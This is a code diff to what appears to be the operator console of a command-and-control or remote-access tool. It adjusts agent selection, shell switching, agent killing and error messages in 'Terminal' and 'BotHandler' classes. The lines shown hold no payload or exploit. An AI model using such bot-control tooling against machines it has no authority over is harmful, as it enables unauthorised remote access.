@@ -27,7 +27,7 @@ import inspect
 
 # TODO:
 #   - verification if agent is alive?
-#   - kill agent
+#   [DONE] kill agent
 #   - list commands in agent mode!
 #   [DONE] correct exit from shell
 #   [DONE] help messages of Cmd 
@@ -53,7 +53,7 @@ class Terminal(Cmd):
         self.shell = False
         self.q = None
         self.agent = None
-        self.parentagent = ''
+        self.parentagent = None
         self.prompt = '$ '
         self.tokill = ''
 
@@ -81,7 +81,7 @@ class Terminal(Cmd):
                 print("[-] Unhandled exception in do_interact function: {}".format(ex))
 
     def do_shell(self,args):
-        if self.q == None:
+        if self.q == None or self.agent == None:
             print("[-] You need to choose agent.")
             self.help_interact()
         else:
@@ -90,10 +90,9 @@ class Terminal(Cmd):
             # For now shell is implemented in separate connection
             # Sleep while shell connection is created
             time.sleep(1)
-
             self.shell = True
 
-            # Parsing last agent ID from queue
+            # Parsing last agent ID from ClientDict
             self.parentagent = self.agent
             self.agent = list(self.ClientDict.keys())[-1]
             
@@ -112,8 +111,10 @@ class Terminal(Cmd):
             self.q.put("exit\n")
             self.shell = False
             self.do_interact(self.parentagent)
+            self.parentagent = None
         else:
             self.q = None
+            self.agent = None
             self.prompt = '$ '
 
     def do_exit(self,args):
@@ -121,6 +122,7 @@ class Terminal(Cmd):
             self.q.put("exit\n")
             self.shell = False
             self.do_interact(self.parentagent)
+            self.parentagent = None
         else:
             time.sleep(0.5)
             os._exit(0)
@@ -130,18 +132,16 @@ class Terminal(Cmd):
             self.tokill = input("Do you want to kill current agent? [y/N] ")
             if self.tokill.lower() == 'y':
                 if self.shell == True:
-                    self.q.put("exit\n")
-                    self.shell = False
-                    self.do_interact(self.parentagent)
+                    self.do_back(self)
                 self.q.put("kill\n")
                 self.q = None
-                self.prompt = '$ '
                 del self.ClientDict[self.agent]
                 self.agent = None
+                self.prompt = '$ '
             elif self.tokill.lower() == 'n' or self.tokill == '':
                 return
             else:
-                print("Do no understand your input.. Doing nothing.")
+                print("[-] Do no understand your input.. Doing nothing.")
                 return
         elif len(args.split(' ')) != 1 or args.split(' ')[0] == '':
             print("[-] Incorrect agent ID specified. Use: 'list agents'")
@@ -336,7 +336,7 @@ class BotHandler(threading.Thread):
                         # if timeout exception is triggered - assume no data anymore
                         recv = ""
                     except Exception as ex:
-                        print("[-] Unplanned exception while getting response: {}".format(ex))
+                        print("[-] Exception while getting response: {}".format(ex))
                         break
                     
                     if not recv:
